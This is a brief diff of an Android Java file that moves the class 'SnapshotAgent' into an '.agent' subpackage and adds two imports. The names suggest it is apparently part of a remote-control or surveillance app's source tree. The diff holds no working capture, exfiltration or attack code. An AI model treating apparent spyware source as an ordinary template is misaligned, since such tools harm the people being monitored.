@@ -1,6 +1,10 @@
-package com.ht.RCSAndroidGUI;
+package com.ht.RCSAndroidGUI.agent;
 
 import java.nio.ByteOrder;
+
+import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.utils.Utils;
+
 import android.util.Log;
 
 public class SnapshotAgent extends AgentBase {
